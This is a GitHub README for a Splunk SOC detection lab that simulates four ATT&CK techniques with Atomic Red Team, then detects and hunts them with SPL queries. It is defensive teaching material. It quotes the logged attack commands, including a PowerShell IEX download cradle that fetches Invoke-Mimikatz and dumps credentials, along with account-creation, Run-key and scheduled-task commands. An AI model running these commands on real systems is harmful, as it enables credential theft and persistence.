# Splunk SIEM — SOC Detection Lab

**Kurzbeschreibung:** Aufbau eines Security Operations Center in einer Lab-Umgebung mit Splunk Enterprise als SIEM. Angriffssimulation mit Atomic Red Team über vier MITRE ATT&CK-Techniken, Erkennung mit gezielten SPL-Abfragen, Threat Hunting und SOC-Dashboard-Entwicklung. Dokumentiert den vollständigen SOC-Analyst-Workflow: von der Angriffssimulation bis zur Alert-Konfiguration und proaktiven Bedrohungssuche.

---

## What This Project Is About

This is a full SOC detection workflow built from scratch. Splunk Enterprise on Ubuntu ingesting Sysmon logs from a Windows 11 endpoint, attack simulation with Atomic Red Team mapped to MITRE ATT&CK, SPL detection queries for each technique, a live alert, a custom dashboard, and three threat hunting scenarios.

The focus is the analyst work, not the infrastructure. The lab overall lab setup is mentioned briefly  in the architechture diagram below, but every screenshot in this README comes from the attack simulation and investigation side.

---

## Architecture

![Lab Architecture](https://github.com/lionelmsango/splunk-soc-detection-lab/blob/35460b2b61afe820fbd0e3f256127d11e9dcdce0/screenshots/splunk_architecture.svg)

---

## Attacks Simulated

Four MITRE ATT&CK techniques across Execution, Persistence, and Credential Access.

---

### T1059.001 — PowerShell: Download Cradle + Credential Dumping

The first test was the most interesting one. Atomic Red Team T1059.001-1 runs a PowerShell IEX download cradle that pulls Invoke-Mimikatz from the PowerSploit repository and calls `sekurlsa::logonpasswords`. With Defender disabled on the lab VM, the full chain ran and Sysmon logged every step.

![T1059.001 Mimikatz via PowerShell](https://github.com/lionelmsango/splunk-soc-detection-lab/blob/8c6f49119aa00adb2485da5305f27c6b5780ce3b/screenshots/01_atomic_powershell_execution.png.jpg)

---

### T1136.001 — Create Local Account

Test T1136.001-4 runs `cmd.exe /c net user /add "T1136.001_CMD"`. The account name is hard to miss in the logs.
![T1136.001 Local Account Creation](https://github.com/lionelmsango/splunk-soc-detection-lab/blob/8c6f49119aa00adb2485da5305f27c6b5780ce3b/screenshots/02_atomic_account_creation.png.jpg)

---

### T1547.001 — Registry Run Key Persistence

Test T1547.001-1 writes `Atomic Red Team` to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. The value points to a payload path and survives reboots.

![T1547.001 Registry Persistence](https://github.com/lionelmsango/splunk-soc-detection-lab/blob/8c6f49119aa00adb2485da5305f27c6b5780ce3b/screenshots/03_atomic_registry_persistence.png.jpg)

---

### T1053.005 — Scheduled Task

Test T1053.005-2 creates a task named `spawn` that runs `cmd.exe` on a schedule. The SCHTASKS output confirms it was created.

![T1053.005 Scheduled Task](https://github.com/lionelmsango/splunk-soc-detection-lab/blob/8c6f49119aa00adb2485da5305f27c6b5780ce3b/screenshots/04_atomic_scheduled_task.png.jpg)

---

## Detection in Splunk

Each attack was found using a targeted SPL query. Here is what the investigation returned for each one.

---

### Detecting T1059.001

```spl
index=sysmon EventCode=1 process_name="powershell.exe"
(CommandLine="*-EncodedCommand*" OR CommandLine="*-enc*" OR
 CommandLine="*bypass*" OR CommandLine="*IEX*" OR CommandLine="*DownloadString*")
| table _time, process_name, CommandLine, parent_process_name, user, host
| sort -_time
```

Splunk returned the full command line: `powershell.exe "IEX (New-Object Net.WebClient).DownloadString('.../Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"` with `cmd.exe` as the parent. The GitHub URL to the PowerSploit repository is visible in the `CommandLine` field.

![Detection of T1059.001 in Splunk](https://github.com/lionelmsango/splunk-soc-detection-lab/blob/efaabf2cfbacc144ee129b32964401099ad922fe/screenshots/05_detection_powershell_suspicious.png.jpg)

---

### Detecting T1136.001

```spl
index=sysmon EventCode=1 (CommandLine="*net user*" OR CommandLine="*net1 user*") earliest=-24h
| table _time, process_name, CommandLine, parent_process_name, user, host
| sort -_time
```

One result: `cmd.exe` running `net user /add "T1136.001_CMD"` with `powershell.exe` as the parent. The process chain (PowerShell spawning cmd.exe spawning net user) is what confirms this was not a legitimate admin action.

![Detection of T1136.001 in Splunk](https://github.com/lionelmsango/splunk-soc-detection-lab/blob/efaabf2cfbacc144ee129b32964401099ad922fe/screenshots/06_detection_account_creation.png.jpg)

---

### Detecting T1547.001

```spl
index=sysmon (EventCode=12 OR EventCode=13)
(TargetObject="*\\CurrentVersion\\Run*" OR TargetObject="*\\CurrentVersion\\RunOnce*")
| table _time, EventCode, Image, TargetObject, Details, user, host
| sort -_time
```

19 events came back. Most were Edge and OneDrive touching their own Run keys. The malicious entry sits at the top: `reg.exe` writing `Atomic Red Team` to `\CurrentVersion\Run`. Having the legitimate activity present actually makes the screenshot more realistic, not less.

![Detection of T1547.001 in Splunk](https://github.com/lionelmsango/splunk-soc-detection-lab/blob/efaabf2cfbacc144ee129b32964401099ad922fe/screenshots/07_detection_registry_persistence.png.jpg)

---

### Detecting T1053.005

```spl
index=sysmon EventCode=1 process_name="schtasks.exe" CommandLine="*/create*" earliest=-24h
| table _time, process_name, CommandLine, parent_process_name, user, host
| sort -_time
```

One result: `SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe`, with `cmd.exe` as the parent. The task name `spawn` and the use of `cmd.exe` as the payload are both worth flagging in a real alert.

![Detection of T1053.005 in Splunk](https://github.com/lionelmsango/splunk-soc-detection-lab/blob/efaabf2cfbacc144ee129b32964401099ad922fe/screenshots/08_detection_scheduled_task.png.jpg)

---

### MITRE ATT&CK Overview

A single query labels each detection by technique ID, giving a combined view of everything caught in the same table.

![MITRE ATT&CK Overview](https://github.com/lionelmsango/splunk-soc-detection-lab/blob/efaabf2cfbacc144ee129b32964401099ad922fe/screenshots/09_mitre_attack_overview.png.jpg)

Three of the four techniques appear here. T1059.001 is missing because this query used `*bypass*` as the PowerShell filter, and the Mimikatz test used `IEX` instead. The individual detection query for T1059.001 catches it correctly. The fix for the combined query is one extra OR condition. This gap is covered in Lessons Learned.

---

### Saved Alert

A scheduled alert for suspicious PowerShell activity triggers when results exceed zero.

![Saved Detection Alert](https://github.com/lionelmsango/splunk-soc-detection-lab/blob/efaabf2cfbacc144ee129b32964401099ad922fe/screenshots/10_saved_alert_triggered.png.jpg)

---

## SOC Dashboard

A custom dashboard built in Splunk shows security event volume over time, MITRE ATT&CK detection counts, top processes, and per-technique counters. The timeline spike shows exactly when the Atomic Red Team tests ran.

![SOC Dashboard Overview](https://github.com/lionelmsango/splunk-soc-detection-lab/blob/efaabf2cfbacc144ee129b32964401099ad922fe/screenshots/11_soc_dashboard_overview.png.jpg)

![MITRE ATT&CK Detections Panel](https://github.com/lionelmsango/splunk-soc-detection-lab/blob/efaabf2cfbacc144ee129b32964401099ad922fe/screenshots/12_soc_dashboard_mitre_detections.png.jpg)

---

## Threat Hunting

These three hunts ran against the same dataset after the attacks, looking for patterns without relying on pre-built alerts. Each one follows the same structure: hypothesis, query, finding.

---

### Hunt 1 — Living-off-the-Land Binary Usage

**Hypothesis:** An attacker used legitimate Windows binaries to blend in with normal activity.

```spl
index=sysmon EventCode=1 earliest=-24h
(process_name="powershell.exe" OR process_name="cmd.exe" OR
 process_name="schtasks.exe" OR process_name="reg.exe" OR
 process_name="wscript.exe" OR process_name="mshta.exe" OR
 process_name="certutil.exe" OR process_name="regsvr32.exe")
| stats count by process_name, parent_process_name
| sort -count
```

**Finding:** 161 events across 12 process relationships. `reg.exe` spawned by `cmd.exe` (4 times) and `schtasks.exe` spawned by `cmd.exe` (1 time) are the attack artifacts. The rest is Splunk's own installer and system activity. Separating those two from the noise is the job.

![LOLBin Hunt Results](https://github.com/lionelmsango/splunk-soc-detection-lab/blob/efaabf2cfbacc144ee129b32964401099ad922fe/screenshots/13_threat_hunt_lolbin_abuse.png.jpg)

---

### Hunt 2 — Rare Process Relationships

**Hypothesis:** The attacker created process relationships that don't normally appear in this environment. Low occurrence count means unusual. Unusual means investigate.

```spl
index=sysmon EventCode=1 earliest=-24h
| stats count by parent_process_name, process_name
| sort count
| head 20
| rename parent_process_name as "Parent Process", process_name as "Child Process", count as "Occurrences"
```

**Finding:** 2,251 events total. `cmd.exe` spawning `schtasks.exe` appears once, sitting alongside other rare pairs at the top of the list. That single occurrence is the scheduled task from the atomic test. Rare relationships don't always mean malicious, but they do mean you look.

![Process Relationship Hunt](https://github.com/lionelmsango/splunk-soc-detection-lab/blob/efaabf2cfbacc144ee129b32964401099ad922fe/screenshots/14_threat_hunt_process_anomaly.png.jpg)

---

### Hunt 3 — Suspicious PowerShell Commands

**Hypothesis:** PowerShell was used to download and run a payload. Hunt for encoded, long, or download-cradle-style command lines.

```spl
index=sysmon EventCode=1 process_name="powershell.exe" earliest=-24h
| eval cmd_length=len(CommandLine)
| eval suspicious=if(
    CommandLine LIKE "%-EncodedCommand%" OR CommandLine LIKE "%-enc %"
    OR CommandLine LIKE "%bypass%" OR CommandLine LIKE "%IEX%"
    OR CommandLine LIKE "%hidden%" OR cmd_length > 200,
    "SUSPICIOUS", "CLEAN")
| stats count by suspicious, CommandLine
| where suspicious="SUSPICIOUS"
| table suspicious, CommandLine, count
| sort -count
```

**Finding:** One result, flagged `SUSPICIOUS`, count 2. The full Mimikatz download cradle is visible: the PowerSploit GitHub URL, the `IEX` call, and `Invoke-Mimikatz -DumpCreds`. This is the same command the detection query found, but discovered here through a proactive hunt rather than a triggered alert.

![Encoded PowerShell Hunt](https://github.com/lionelmsango/splunk-soc-detection-lab/blob/efaabf2cfbacc144ee129b32964401099ad922fe/screenshots/15_threat_hunt_encoded_powershell.png.jpg)

---

## Lessons Learned

**The Sysmon channel needs an explicit permission fix.** The Universal Forwarder runs as Local System, but Sysmon's Operational log channel blocks external subscriptions by default. The symptom is `errorCode=5` in `splunkd.log`. The fix is a `wevtutil set-log` command that rewrites the channel's security descriptor to grant Local System explicit read access. This does not appear in Splunk's standard setup documentation.

**Detection rules need to be tested against real attack behaviour.** The MITRE overview query used `*bypass*` to catch PowerShell abuse. The Mimikatz test used `IEX`, not bypass. The individual detection query caught it. The combined rule missed it. The gap is one OR condition. Finding that gap is exactly what running the attacks is for.

**Atomic Red Team test numbers shift between versions.** The expected test numbers for some techniques didn't exist at those positions. Running `-ShowDetailsBrief` before every `Invoke-AtomicTest` call is the right habit.

**PowerShell execution policy resets per session.** Setting `-Scope Process` only holds for the current window. Using `-Scope CurrentUser` persists across sessions.

---

## Related Projects

| Project | Description |
|---------|-------------|
| [Microsoft Defender for Endpoint](https://github.com/lionelmsango/defender-for-endpoint) | EDR layer on the same type of Windows endpoint this lab monitors |
| [Wazuh SIEM](https://github.com/lionelmsango/wazuh-siem-lab) | Open-source SIEM with a different architecture but the same monitoring goals |
| [Microsoft Intune: Modern Workplace](https://github.com/lionelmsango/intune-modern-workplace-lab) | Device compliance and management baseline for endpoints in a monitored environment |
| [pfSense Firewall Administration](https://github.com/lionelmsango/pfsense-firewall-lab) | Network-layer security that generates the traffic a SIEM like this would monitor |
